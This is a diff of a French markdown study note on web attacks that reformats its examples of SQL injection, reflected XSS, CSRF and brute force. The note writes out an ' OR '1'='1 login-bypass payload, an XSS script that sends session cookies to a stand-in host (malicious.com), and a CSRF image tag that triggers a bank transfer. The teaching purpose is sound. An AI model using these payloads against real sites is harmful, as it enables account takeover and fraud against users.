@@ -190,38 +190,38 @@ sommaire :
 1. **injection SQL**   
    injecter une requete sql "malveillante", qui fait fonctionner la base de donnee d'une maniere imprevue   
 	 ex d'injection sur une page de connexion :
-	 1. la page a 2 champs de formulaire pour se connecter 'username' et 'password' :
-	    "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
-   2. si on remplis uniquement le 'username' avec [' OR '1'='1], ca donne cette requete :
-			SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
-			1=1 est toujours vraie donc on peut se connecter avec n'importe username sans le mot de passe
+	 - la page a 2 champs de formulaire pour se connecter 'username' et 'password' :   
+	   `"SELECT * FROM users WHERE username = '$username' AND password = '$password'";`
+   - si on remplis uniquement le 'username' avec [' OR '1'='1], ca donne cette requete :   
+		 `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';`   
+		 1=1 est toujours vraie donc on peut se connecter avec n'importe username sans le mot de passe
 2. **xss**   
    Cross-Site Scripting   
    injecter du code "malveillant" sur une page vue par un autre utilisateur, par exemple pour recuperer ses cookies de session   
    ex d'attaque xss sur un site web qui permet de faire une recherche :
-	 1. le site possede une page avec un champ de recherche, on peut chercher "babar" par exemple :
-			`recherche: [babar]`
-   2. lorsqu'on valide la recherche, elle est envoyé avec la methode GET au back :
-			`https://exemple.com/search?query=babar`
-   3. le site affiche ensuite la recherche en plus des resultats :
-	    `les resultats pour votre recherche "babar" sont etc...`
-   4. donc si on envoit cette url à quelqu'un, il va voir les resultats s'afficher :
-	    `https://exemple.com/search?query=babar`
-			`les resultats pour votre recherche "babar" sont etc...`
-   5. au lieu d'envoyer "babar" dans le champs de recherche de l'url, on peut y mettre un script, il s'executera dans le front :
-		  `<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>`
-			les resultats pour votre recherche <script>...</script>   
-			-> le script est executé   
-			en l'occurence, il vole les cookies de session de la personne et les envois a l'adresse "http://malicious.com/steal", on peut donc ensuite se connecter a son compte
+	 - le site possede une page avec un champ de recherche, on peut chercher "babar" par exemple :   
+		 `recherche: [babar]`
+   - lorsqu'on valide la recherche, elle est envoyé avec la methode GET au back :   
+		 `https://exemple.com/search?query=babar`
+   - le site affiche ensuite la recherche en plus des resultats :   
+	   `les resultats pour votre recherche "babar" sont etc...`
+   - donc si on envoit cette url à quelqu'un, il va voir les resultats s'afficher :   
+	   `https://exemple.com/search?query=babar`   
+		 `les resultats pour votre recherche "babar" sont etc...`
+   - au lieu d'envoyer "babar" dans le champs de recherche de l'url, on peut y mettre un script, il s'executera dans le front :   
+		 `<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>`   
+		 les resultats pour votre recherche <script>...</script>   
+		 -> le script est executé   
+		 en l'occurence, il vole les cookies de session de la personne et les envois a l'adresse "http://malicious.com/steal", on peut donc ensuite se connecter a son compte
 3. **csrf**
    Cross-Site Request Forgery   
 	 amener une personne à executer une action non-desiree sur un site web sur lequel elle est connectée, sans s'en rendre compte   
 	 ex d'attaque pour recevoir un virement d'une personne :
-	 1. une personne est connectée à sa banque en ligne
-	 2. elle recoit un email de l'attaquant avec une image
-	 3. le code de l'image contient en fait une url de transfert de sa banque :
-	    `<img src="http://yourbank.com/transfer?amount=1000&to=attacker_account" />`
-   4. comme la personne est connectee en ce moment meme à sa banque, celle-ci effectue le virement sans avertir (banque bien pourrave)
+	 - une personne est connectée à sa banque en ligne
+	 - elle recoit un email de l'attaquant avec une image
+	 - le code de l'image contient en fait une url de transfert de sa banque :   
+	   `<img src="http://yourbank.com/transfer?amount=1000&to=attacker_account" />`
+   - comme la personne est connectee en ce moment meme à sa banque, celle-ci effectue le virement sans avertir (banque bien pourrave)
 4. **brute force**
    cette attaque consiste à essayer toutes les combinaisons possibles d'un mot de passe, jusqu'a tomber sur le bon   
 	 c'est une attaque simple à code donc pleins de petits robots parcours internet pour essayer automatiquement sur les sites webs   
